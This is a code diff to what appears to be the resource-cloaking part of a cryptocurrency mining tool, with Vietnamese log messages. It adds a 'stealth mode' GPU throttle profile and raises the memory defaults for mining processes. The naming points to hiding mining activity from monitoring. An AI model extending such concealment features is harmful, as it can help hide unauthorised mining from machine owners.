@@ -246,8 +246,16 @@ class GpuCloakStrategy(CloakStrategy):
         if not self.allowed_process_name:
             self.logger.warning("Không tìm thấy cấu hình tiến trình GPU (key='GPU') trong config.")
 
-        # ✅ UNIFIED: GPU Performance Control
-        self.throttle_percentage = config.get('throttle_percentage', 20)
+        # ✅ UNIFIED: GPU Performance Control với Stealth Mode Support
+        # Check for stealth_mode configuration first
+        self.stealth_mode = config.get('stealth_mode', False)
+        if self.stealth_mode:
+            # Apply stealth_mode profile: power_limit=80% → throttle_percentage=20%
+            self.throttle_percentage = 20  # 80% power → 20% reduction
+            self.logger.info("🔒 [STEALTH MODE] Activated - power_limit=80%, throttle=20%")
+        else:
+            self.throttle_percentage = config.get('throttle_percentage', 20)
+            
         if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
             self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định=20%.")
             self.throttle_percentage = 20
@@ -264,6 +272,11 @@ class GpuCloakStrategy(CloakStrategy):
         self.enable_thermal_monitoring = config.get('enable_thermal_monitoring', True)
         self.thermal_check_interval = config.get('thermal_check_interval', 5)  # seconds
         self.target_mem_clock = config.get('mem_clock', 877)
+        
+        # ✅ SMART CLOAKING: Conditional logic parameters
+        self.adaptive_throttling = config.get('adaptive_throttling', True)
+        self.smart_power_scaling = config.get('smart_power_scaling', True)
+        self.emergency_fallback = config.get('emergency_fallback', True)
 
         self.temperature_threshold = config.get('temperature_threshold', 80)
         if self.temperature_threshold <= 0:
@@ -874,10 +887,22 @@ class MemoryCloakStrategy(CloakStrategy):
         self.memory_resource_manager = cast(Any, memory_resource_manager)
         self.cache_resource_manager = cast(Any, cache_resource_manager)
 
-        self.memory_limit_mb = config.get('memory_limit_mb', 2048)
+        # ✅ SMART MEMORY: GPU-aware memory allocation
+        self.gpu_aware = config.get('gpu_aware', True)
+        self.smart_mode = config.get('smart_mode', True)
+        
+        # Dynamic memory based on process type
+        base_memory = config.get('memory_limit_mb', 6144)
+        if self.gpu_aware and self.smart_mode:
+            # Enhanced memory for GPU processes
+            self.memory_limit_mb = base_memory
+            self.logger.info(f"🧠 [SMART MEMORY] GPU-aware mode: {self.memory_limit_mb}MB allocation")
+        else:
+            self.memory_limit_mb = base_memory
+            
         if self.memory_limit_mb <= 0:
-            self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=2048.")
-            self.memory_limit_mb = 2048
+            self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=6144.")
+            self.memory_limit_mb = 6144
 
     def apply(self, process: MiningProcess) -> bool:
         """
